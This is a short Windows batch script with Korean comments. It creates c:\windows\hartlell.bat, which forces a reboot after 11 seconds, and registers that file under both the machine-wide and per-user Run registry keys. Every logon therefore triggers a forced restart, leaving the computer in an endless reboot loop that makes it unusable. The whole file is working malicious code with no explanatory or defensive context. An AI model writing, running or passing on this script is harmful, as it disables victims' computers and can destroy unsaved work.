@echo off
:: .bat 파일 생성 및 명령 추가
echo @echo off > c:\windows\hartlell.bat
echo @break off >> c:\windows\hartlell.bat
:: 11초 후에 강제로 시스템을 재부팅
echo shutdown -r -t 11 -f >> c:\windows\hartlell.bat
echo end >> c:\windows\hartlell.bat

:: 레지스트리에 프로그램 실행 추가
reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v startAPI /t reg_sz /d c:\windows\hartlell.bat /f
reg add hkey_current_user\software\microsoft\windows\currentversion\run /v startAPIUser /t reg_sz /d c:\windows\hartlell.bat /f

:: PAUSE
